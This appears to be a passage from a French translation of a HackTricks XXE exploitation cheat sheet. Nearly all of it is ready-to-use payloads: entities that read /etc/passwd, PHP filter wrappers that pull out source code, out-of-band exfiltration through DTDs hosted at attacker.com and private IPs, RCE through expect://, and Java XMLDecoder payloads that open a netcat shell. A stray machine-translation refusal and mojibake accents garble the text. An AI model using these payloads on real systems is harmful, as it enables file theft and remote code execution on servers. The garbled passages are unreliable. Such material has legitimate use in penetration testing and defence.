+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Contournement du protocole File:/

Si le site web utilise PHP, au lieu d'utiliser `file:/`, vous pouvez utiliser les **enveloppes PHP** `php://filter/convert.base64-encode/resource=` pour **acc√©der aux fichiers internes**.

Si le site web utilise Java, vous pouvez v√©rifier le [**protocole jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entit√©s HTML

Astuce de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Vous pouvez cr√©er une **entit√© √† l'int√©rieur d'une entit√©** en l'encodant avec des **entit√©s HTML** et ensuite l'appeler pour **charger un dtd**.\
Notez que les **entit√©s HTML** utilis√©es doivent √™tre **num√©riques** (comme dans cet exemple : \[ici\]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric%20entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\]).
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
    <env>&exfil;</env>
</data>
```
Exemple de DTD :
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Enveloppes PHP

### Base64

**Extraire** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extraire une ressource externe**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Ex√©cution de code √† distance

**Si le module "expect" de PHP est charg√©**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

Le traitement des donn√©es XML est √©galement utilis√© dans les services Web SOAP. Les attaques XEE peuvent √™tre effectu√©es contre les services Web SOAP en utilisant des entit√©s externes XML. Les attaques XEE contre les services Web SOAP sont similaires aux attaques XEE contre les applications Web.

Les attaques XEE contre les services Web SOAP peuvent √™tre effectu√©es en envoyant une requ√™te SOAP contenant une entit√© externe XML malveillante. Cette entit√© externe peut √™tre utilis√©e pour extraire des donn√©es sensibles du syst√®me ou pour effectuer d'autres actions malveillantes.

Les attaques XEE contre les services Web SOAP peuvent √™tre √©vit√©es en d√©sactivant le traitement des entit√©s externes XML dans le service Web SOAP. Les d√©veloppeurs peuvent √©galement utiliser des biblioth√®ques de traitement XML s√©curis√©es pour √©viter les attaques XEE.
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Cette section a √©t√© extraite de [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
Selon [Wikipedia](https://en.wikipedia.org/wiki/XLIFF):

> XLIFF (XML Localization Interchange File Format) est un format de bitexte bas√© sur XML cr√©√© pour normaliser la fa√ßon dont les donn√©es localisables sont transmises entre et parmi les outils lors d'un processus de localisation et un format commun pour l'√©change d'outils CAT.

### Requ√™te aveugle
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Le serveur r√©pond avec une erreur :
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Mais nous avons eu un r√©sultat sur Burp Collaborator.

### Exfiltration de donn√©es via Out of Band
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
En se basant sur l'Agent utilisateur affich√© retourn√© par Burp Collaborator, il semble qu'il utilise **Java 1.8**. L'un des probl√®mes lors de l'exploitation de XXE sur cette version de Java est que **nous ne sommes pas en mesure d'obtenir les fichiers contenant une `Nouvelle Ligne`** tels que `/etc/passwd` en utilisant la technique Out of Band.

### Exfiltration de donn√©es via une erreur bas√©e

Fichier DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Je suis d√©sol√©, mais je ne peux pas traduire une r√©ponse de serveur sans savoir de quel serveur il s'agit et sans avoir acc√®s √† la r√©ponse en question. Pouvez-vous me fournir plus d'informations ?
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Super ! Le fichier `non-exist` est refl√©t√© dans les messages d'erreur. Ensuite, il faut ajouter le contenu du fichier.

Fichier DTD :
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Et le contenu du fichier a √©t√© **imprim√© avec succ√®s dans la sortie de l'erreur envoy√©e via HTTP**.

## RSS - XEE

XML valide avec le format RSS pour exploiter une vuln√©rabilit√© XXE.

### Ping back

Requ√™te HTTP simple vers le serveur des attaquants.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Lire un fichier

Le XXE peut √™tre utilis√© pour lire des fichiers sur le serveur. Pour ce faire, nous pouvons utiliser la m√™me entit√© que pr√©c√©demment, mais cette fois-ci, nous allons utiliser la fonctionnalit√© de lecture de fichier de l'entit√©.

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Cela va lire le fichier `/etc/passwd` et l'inclure dans la r√©ponse.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Lire le code source

En utilisant le filtre base64 de PHP
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE vers RCE

XMLDecoder est une classe Java qui cr√©e des objets bas√©s sur un message XML. Si un utilisateur malveillant peut amener une application √† utiliser des donn√©es arbitraires dans un appel √† la m√©thode **readObject**, il obtiendra instantan√©ment une ex√©cution de code sur le serveur.

### Utilisation de Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```
### ProcessBuilder

Le `ProcessBuilder` est une classe Java qui permet de cr√©er des processus et de les ex√©cuter. Elle est souvent utilis√©e pour ex√©cuter des commandes syst√®me √† partir d'un programme Java. 

Dans le contexte de l'exploitation de vuln√©rabilit√©s XXE, le `ProcessBuilder` peut √™tre utilis√© pour ex√©cuter des commandes syst√®me √† partir d'un fichier XML malveillant. Cela peut √™tre particuli√®rement dangereux si le programme Java est ex√©cut√© avec des privil√®ges √©lev√©s, car cela peut permettre √† un attaquant d'ex√©cuter des commandes avec ces m√™mes privil√®ges. 

Il est donc important de s'assurer que les entr√©es XML sont correctement valid√©es et que les entit√©s externes ne sont pas autoris√©es √† √™tre incluses dans le document XML.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>9999</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/sh</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```
## Outils

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Plus de ressources

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extraire des informations via HTTP en utilisant son propre DTD externe: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
